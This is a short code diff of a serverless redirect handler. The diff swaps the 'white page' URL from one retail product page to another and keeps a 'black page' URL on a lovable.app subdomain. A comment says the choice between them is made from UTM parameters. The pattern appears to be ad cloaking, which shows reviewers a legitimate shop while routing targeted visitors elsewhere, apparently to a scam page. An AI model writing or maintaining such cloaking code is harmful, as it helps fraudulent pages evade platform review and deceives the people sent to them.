@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.macys.com/shop/product/wild-pair-alegro-bow-slingback-pumps-created-for-macys?ID=18437924&swatchColor=Pinkesque";
+    const whitePageURL = "https://cherriebaby.com.au/collections/cinnamon-baby/products/cinnamon-baby-plaid-short-pyjamas-red-preorder#";
     const blackPageURL = "https://luvcshap.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
